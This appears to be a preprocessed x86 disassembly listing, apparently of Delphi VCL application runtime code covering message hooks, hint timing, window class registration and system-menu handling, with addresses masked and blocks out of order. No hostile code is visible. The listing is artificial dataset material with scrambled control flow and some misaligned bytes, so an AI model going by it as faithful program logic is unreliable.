dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418cf8
mov dl [ ebp - 0x1 ]
call sub_46c770
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46c064
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418b9c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_418d74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418cf8
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46c710
test al al
je r-xdata
inc esi
sub_46ca6c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46c078
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46c064
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_46cac4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46ca6c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46cb3e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46c920
pop ecx
push ebp
mov al 0x2
call sub_46c920
pop ecx
push ebp
mov al 0x3
call sub_46c920
pop ecx
push ebp
mov al 0x4
call sub_46c920
pop ecx
push ebp
mov al 0x5
call sub_46c920
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_46cb4c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c6e0
xor eax eax
push ebp
push sub_46cbc5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46cac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46c6e8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46cbe0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404118
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40416c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46cc38
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4037e4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46f084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46cc8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44d12c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46f100
sub_46cce8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46e1a0
sub_46cd2c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46cce8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46cc8c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_46cda0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46cdfc
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46ce2c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46ce54
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46cdfc
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46ce2c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46ce2c
sub_46ce94
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421a7c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46e56c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429a54
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_429e24
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46ed04
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40cb3c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46e764
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40cb64
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408be0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404388
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46eee0
mov eax ebx
call sub_46f8a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46d19c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46d07d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_46f8b4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46e56c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46e764
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46f100
xor edx edx
mov eax esi
call sub_46ea7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
push esi
push sub_46d5d0
mov eax esi
call sub_46e358
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405ab8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_40331c
mov eax [ esi + 0x90 ]
call sub_40331c
mov eax [ esi + 0x98 ]
call sub_40331c
test bl bl
jle r-xdata
call sub_422ba4
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_46d19c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46d33d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d344
lea eax [ ebp - 0x2c ]
call sub_404118
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_46d71c
call sub_422b0c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4045d8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406eec
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404118
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46de20
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46de20
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46d34c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_46c080
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46d3ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418b9c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4550b4
cmp ebx eax
je r-xdata
sub_46d41c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46d3ac
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418cf8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46d534
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418cf8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46d5d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40ce04
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46c58c
mov eax [ rw-data ]
call sub_46cbd4
sub_46d628
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d685
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d68c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404310
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46d694
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46d6d0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46de20
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_46d71c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4037e4#8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d5d0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46e83c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418cf8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4550b4
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46f768
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46e358
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46e2fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4550b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46de20
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_46cbd4
push ebp
call sub_46d694
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46d694
pop ecx
jmp [ eax * 4 + jump_table_46d7c0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4550b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46e1d4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459a70
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d628
push ebp
call sub_46d694
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46d694
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46d694
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4213f8
jmp r-xdata
xor eax eax
call sub_465538
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4550b4
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44fa80
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46de3c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46d694
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
